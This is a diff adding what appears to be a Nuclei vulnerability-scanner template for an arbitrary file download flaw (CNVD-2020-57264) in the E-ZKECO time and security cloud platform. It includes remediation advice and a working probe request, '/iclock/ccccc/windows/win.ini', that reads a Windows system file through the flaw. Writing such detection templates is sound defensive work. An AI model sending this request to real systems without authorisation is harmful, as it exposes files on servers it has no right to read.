@@ -1,0 +1,27 @@
+id: CNVD-2020-57264
+info:
+  name: E-ZKECO Time and Security Fine-Management Cloud Platform Arbitrary File Download Vulnerability
+  author:
+  - l0ne1y
+  description: |-
+    The E-zkeco security fine-management cloud platform has an arbitrary file download vulnerability
+    Beijing Zhongkong Technology Development Co., Ltd. is an enterprise active in fields such as time and security management, venture capital, green agriculture, mining, and OEM production. The Time and Security Fine-Management Cloud Platform of Beijing Zhongkong Technology Development Co., Ltd. has an arbitrary file download vulnerability. An attacker can exploit this vulnerability to read arbitrary files.
+  severity: high
+  remediation: |-
+    Official fix:
+    The vendor has not yet provided a patch; please check the vendor homepage for updates: http://www.zksoftware.com/
+
+    Temporary fix:
+    <br/>1. Filter "." so that users cannot traverse to parent directories in the URL.<br/>2. Strictly validate the format of user-supplied parameters using regular expressions; hard-code or uniformly encode the file name parameter passed by the user, control file types through a whitelist, and reject parameters containing malicious or empty characters.<br/>3. Disable directory traversal services on the system; for example, set open_basedir in php.ini to restrict the file access scope.
+requests:
+- matchers:
+  - type: word
+    words:
+    - for 16-bit app support
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/iclock/ccccc/windows/win.ini'
+  method: GET
